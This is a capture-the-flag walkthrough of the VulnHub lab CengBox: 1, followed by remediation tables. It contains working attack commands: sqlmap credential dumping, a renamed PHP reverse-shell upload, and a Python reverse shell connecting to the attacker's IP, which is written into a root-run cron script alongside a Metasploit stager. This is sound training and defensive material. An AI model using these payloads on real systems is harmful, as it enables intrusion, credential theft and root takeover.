# CengBox: 1

The upload filter said "no PHP allowed," so we handed it a `.ceng` file instead. That was literally it, dude. CengBox: 1 is an easy-rated box that walks you through a tight four-step chain: SQLi dumps admin credentials, a blacklist-only upload filter gets bypassed with a renamed shell, and a root-owned Python script running on a cron job with world-write permissions hands you root without breaking a sweat. Simple box, legit real-world lessons.

---

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | CengBox: 1 (Linux, 192.168.1.106) |
| **Attacker VM** | Kali Linux 192.168.1.112 |
| **VulnHub URL** | https://www.vulnhub.com/entry/cengbox-1,475/ |
| **Techniques** | Port scan, directory brute-force, SQL injection, file upload filter bypass, Python cron script hijack |
| **CVEs / EDBs** | No assigned CVE (generic SQLi + upload bypass); EDB-type misconfigurations |
| **APT Groups** | APT41 (web app exploitation for initial access), FIN7 (upload-based webshell deployment) |

---

## Attack Summary

```
[nmap] ---> port 80 (Apache)
             |
             v
[dirb big.txt] ---> /uploads, /masteradmin
             |
             v
[dirb .php on /masteradmin] ---> login.php, upload.php
             |
             v
[sqlmap --forms] ---> dump cengbox DB ---> masteradmin:C3ng0v3R00T1!
             |
             v
[login.php] ---> authenticated admin panel
             |
             v
[upload.php] ---> .php rejected ---> rename to .ceng ---> uploaded
             |
             v
[nc -lvp 1234] ---> browse /uploads/shell.ceng ---> reverse shell
             |
             v
[su cengover] ---> C3ng0v3R00T1! ---> user.txt
             |
             v
[pspy64] ---> UID=0 running /home/cengover/md5check.py
             |
             v
[echo MSF stager > md5check.py] ---> cron triggers ---> root Meterpreter
```

---

## Methodology

1. Network discovery and port scan
2. Directory brute-force to locate admin panel and upload directory
3. SQL injection on admin login form to extract credentials
4. File upload filter bypass via extension rename (.php to .ceng)
5. Reverse shell stabilization and lateral movement via credential reuse
6. Process monitoring with pspy to identify root-scheduled Python script
7. Python script replacement with Metasploit stager for root Meterpreter

---

## Step 1: Network Discovery and Port Scan

**Context:** Target IP is known from the host-only network (192.168.1.106). Confirming open services.

```bash
sudo netdiscover
nmap -p- -A 192.168.1.106
```

**Expected output (condensed):**
```
80/tcp  open  http  Apache httpd 2.x
```

Only port 80 is open. Apache web server confirmed.

**Alternative:** `masscan -p1-65535 192.168.1.106 --rate=1000` for faster full-port sweep.

**Real-world note:** Single-service exposure does not mean single attack surface. Web apps on port 80 can chain multiple vulnerabilities into full system compromise, as this box demonstrates.

**MITRE TTP:** T1046 - Network Service Scanning

---

## Step 2: Directory Enumeration

**Context:** Default web page is shown on port 80. Need to discover hidden directories and application endpoints.

```bash
dirb http://192.168.1.106/ /usr/share/wordlists/big.txt
# Found: /uploads, /masteradmin

dirb http://192.168.1.106/masteradmin -X .php
# Found: /masteradmin/login.php, /masteradmin/upload.php
```

**Alternative:** `gobuster dir -u http://192.168.1.106/masteradmin -x php,html,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt`

**Real-world note:** A directory named `/masteradmin` is not obscurity. Security by obscurity is not security, bruh. Any attacker running dirb or gobuster will find this in under a minute.

**MITRE TTP:** T1083 - File and Directory Discovery

---

## Step 3: SQL Injection on Admin Login

**Context:** Login form at `/masteradmin/login.php` does not appear to accept default credentials. SQLmap time.

```bash
sqlmap -u http://192.168.1.106/masteradmin/login.php --forms --dbs --batch
sqlmap -u http://192.168.1.106/masteradmin/login.php --forms \
  -D cengbox --dump-all --batch
```

**Expected output (condensed):**
```
Database: cengbox
Table: admin
| masteradmin | C3ng0v3R00T1! |
```

Credentials recovered:
- Username: `masteradmin`
- Password: `C3ng0v3R00T1!`

**Alternative:** Manual SQLi test first: try `' OR 1=1-- -` in the username field. If the app logs in, no need for sqlmap.

**Real-world note:** SQLi on admin login forms is a textbook pentest finding that still shows up in production assessments. Parameterized queries have been the fix for 20+ years and developers still miss this. FIN7 has leveraged this exact attack vector against retail and hospitality targets.

**MITRE TTP:** T1190 - Exploit Public-Facing Application

---

## Step 4: File Upload Filter Bypass

**Context:** Authenticated in the admin panel. The file upload endpoint at `upload.php` blocks `.php` files. This is a blacklist-based filter, which is inherently bypassable.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.ceng
# Edit shell.ceng: set $ip = "192.168.1.112" and $port = 1234
```

Upload `shell.ceng` via the admin upload panel at `/masteradmin/upload.php`.

Start a listener:

```bash
nc -lvp 1234
```

Browse to:
```
http://192.168.1.106/uploads/shell.ceng
```

Reverse shell connects back. Noice.

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Alternative:** Try other non-standard extensions: `.php5`, `.phtml`, `.phar`. The server must be configured to execute them. Test with a simple `<?php phpinfo(); ?>` first.

**Real-world note:** Blacklist-based upload filters are consistently bypassed in real-world engagements. The correct approach is whitelist-based validation: only accept specific known-safe MIME types, validate magic bytes, and never execute files from the upload directory. This finding appears in OWASP A04:2021 (Insecure Design).

**MITRE TTP:** T1505.003 - Web Shell, T1190 - Exploit Public-Facing Application

---

## Step 5: Lateral Movement via Credential Reuse

**Context:** Shell is running as www-data or equivalent web service account. The admin password from the database might be reused.

```bash
su cengover
# Password: C3ng0v3R00T1!
id
# uid=1000(cengover)
cat /home/cengover/user.txt
```

**Real-world note:** Password reuse across system accounts and database accounts is endemic. Developers who set up admin panels often use the same password for their Linux user account. Always test credential reuse during post-exploitation.

**MITRE TTP:** T1078 - Valid Accounts, T1552.001 - Unsecured Credentials: Credentials in Files

---

## Step 6: Privilege Escalation via Root-Scheduled Writable Python Script

**Context:** Need to find a privilege escalation path from `cengover`. Running pspy to monitor process execution without root access.

Upload and run `pspy64`:

```bash
cd /tmp
wget http://192.168.1.112/pspy64
chmod +x pspy64
./pspy64
```

**pspy output (relevant line):**
```
2024/01/01 12:00:00 CMD: UID=0   PID=xxxx  | /usr/bin/python3 /home/cengover/md5check.py
```

The script `/home/cengover/md5check.py` runs as UID 0 (root) on a schedule. Check permissions:

```bash
ls -la /home/cengover/md5check.py
# -rw-rw-rw- ... root root ... md5check.py
```

World-writable. This is the privesc vector, fr fr.

Use Metasploit web delivery to generate a Python stager:

```
msfconsole
use exploit/multi/script/web_delivery
set target 7      # Python
set lhost 192.168.1.112
set lport 6789
exploit
```

Copy the generated one-liner into the Python script:

```bash
echo 'exec(__import__("base64").b64decode("PAYLOAD_HERE"))' > /home/cengover/md5check.py
```

When root executes the script next, a root Meterpreter session opens.

```
meterpreter > getuid
# root
cat /root/root.txt
```

GG, rekt.

**Alternative:** Simpler payload for the Python script that spawns a reverse shell without Metasploit:

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("192.168.1.112",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

**Real-world note:** World-writable scripts executed by root via cron are a critical misconfiguration. This exact pattern appears in production systems where a developer wrote a maintenance script and set permissions too broadly. Combined with cron, it is a trivial path to full compromise. The fix is simple: `chown root:root /home/cengover/md5check.py && chmod 700 /home/cengover/md5check.py`.

**MITRE TTP:** T1053.003 - Scheduled Task/Job: Cron, T1059.006 - Command and Scripting Interpreter: Python, T1548 - Abuse Elevation Control Mechanism

---

## Captured Flags, Hashes, and Credentials

| Type | Value | Source |
|---|---|---|
| Admin credentials | `masteradmin:C3ng0v3R00T1!` | SQLMap dump from `cengbox` DB |
| Lateral movement creds | `cengover:C3ng0v3R00T1!` | Credential reuse |
| User flag | See /home/cengover/user.txt | After `su cengover` |
| Root flag | See /root/root.txt | Root Meterpreter via md5check.py |

---

## Lessons Learned

| Finding | Impact | Real-World Relevance |
|---|---|---|
| SQL injection on admin login form | Admin credential dump via automated tool in seconds | Parameterized queries are a 20-year-old fix; apps still get deployed without them |
| Blacklist-only file upload validation | PHP shell execution via renamed extension (.ceng) | Whitelist MIME-type validation and magic-byte checking would have stopped this cold |
| Password reuse across DB and Linux accounts | Lateral movement without additional exploitation | Password managers and unique credentials per service prevent this trivial pivot |
| World-writable Python script executed by root cron | Trivial root privilege escalation | Cron scripts must be owned and writable only by root; regular permission audits catch this |
| pspy enables process discovery without root | Reveals root-scheduled processes to unprivileged attackers | Defenders should monitor for pspy execution (static binary execution in /tmp) as an indicator of privilege escalation reconnaissance |

---

## MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Web Shell | T1505.003 | Persistence |
| Valid Accounts | T1078 | Lateral Movement |
| Command and Scripting Interpreter: Python | T1059.006 | Execution |
| Scheduled Task/Job: Cron | T1053.003 | Privilege Escalation |
| Abuse Elevation Control Mechanism | T1548 | Privilege Escalation |
| Network Service Scanning | T1046 | Discovery |
| File and Directory Discovery | T1083 | Discovery |
| Unsecured Credentials: Credentials in Files | T1552.001 | Credential Access |
| Brute Force (automated SQLi) | T1110 | Credential Access |

---

## Remediation

### NIST CSF 2.0

| Function | Control | Action |
|---|---|---|
| PR.DS-2 | Data in Transit Protection | Enforce HTTPS; remove HTTP-only admin panels |
| PR.AC-4 | Access Permissions and Authorizations | Restrict admin panel access to trusted IPs; implement MFA |
| DE.CM-7 | Monitoring for Unauthorized Activity | Alert on cron job modification; monitor file write events in user home directories |
| ID.AM-2 | Software Asset Management | Inventory all custom scripts executed by cron; flag those with broad permissions |

### NIST SP 800-53

| Control | Description |
|---|---|
| SI-10 | Information Input Validation (parameterize all SQL queries) |
| SI-16 | Memory Protection (validate and restrict file uploads by MIME type and magic bytes) |
| CM-6 | Configuration Settings (enforce least-privilege permissions on cron scripts) |
| AC-6 | Least Privilege (web server process should not have access to user home directories) |
| AU-12 | Audit Record Generation (log all file writes to cron-executed script paths) |

### CISA KEV / Known Exploited Vectors

SQL injection and file upload bypass are documented in CISA advisories for numerous CMS and web application products. The specific vulnerability classes here map to OWASP A03:2021 (Injection) and A04:2021 (Insecure Design). Cron-based privilege escalation via writable scripts is documented in CISA guidance on Linux hardening.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Current Maturity | Target Maturity | Gap |
|---|---|---|---|
| Asset, Change, and Configuration Management | MIL0 (no script permission audits) | MIL2 | Implement automated permission baseline checks on cron-executed scripts |
| Threat and Vulnerability Management | MIL0 (no code review for SQLi) | MIL2 | SAST scanning in CI/CD; quarterly penetration testing |
| Identity and Access Management | MIL1 (basic passwords, no MFA) | MIL2 | Enforce MFA on admin panels; unique credentials per service |

### MITRE D3FEND

| D3FEND Technique | ID | Addresses |
|---|---|---|
| File Content Policies | D3-FCOP | Validate upload MIME types and magic bytes |
| Process Spawn Analysis | D3-PSA | Detect Python processes spawning from cron with unexpected lineage |
| Scheduled Job Analysis | D3-SJA | Monitor cron job definitions and scheduled script modifications |
| Database Query String Analysis | D3-DQSA | Detect SQL injection patterns in admin login requests |

---

## Final Thoughts

CengBox: 1 is a clean, beginner-friendly box that does not need exotic techniques to root. The chain is four steps: find the admin panel, dump creds with SQLi, bypass the upload filter, and then let pspy tell you that root is literally running your script for you. Each step is a standalone real-world finding that you will encounter in actual penetration tests.

The upload filter bypass is the most instructive step. The server blocked `.php` but ran `.ceng` without batting an eye. This is the classic blacklist problem: you can only enumerate what you think is dangerous. Defenders need to flip the model, whitelist only what is safe, not blacklist what looks dangerous.

Thanks guys!! (❍ᴥ❍ʋ)
